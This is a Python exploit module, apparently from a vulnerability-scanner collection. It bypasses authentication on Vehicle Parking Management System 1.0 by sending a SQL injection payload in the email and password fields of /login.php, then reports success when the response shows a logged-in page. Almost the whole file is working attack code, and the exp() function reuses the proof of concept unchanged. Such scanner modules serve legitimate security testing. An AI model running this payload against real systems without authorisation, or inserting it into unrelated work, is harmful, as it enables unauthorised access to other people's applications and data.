import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Vehicle Parking Management System 1.0 - Authentication Bypass''',
        "description": '''The Vehicle Parking Management System allows remote attackers to bypass the authentication system by utilizing an SQL injection vulnerability in the 'password' parameter.''',
        "severity": "high",
        "references": [
            "https://www.exploit-db.com/exploits/48877"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["auth-bypass"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/login.php"""
        method = "POST"
        data = """email=%27%3D%27%27or%27%40email.com&password=%27%3D%27%27or%27&btn_login=1"""
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'PHPSESSID=q4efk7p0vo1866rwdxzq8aeam8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""LAGOS PARKER""" in resp0.text and """Login Successfully""" in resp0.text and """location.href = 'index.php';""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url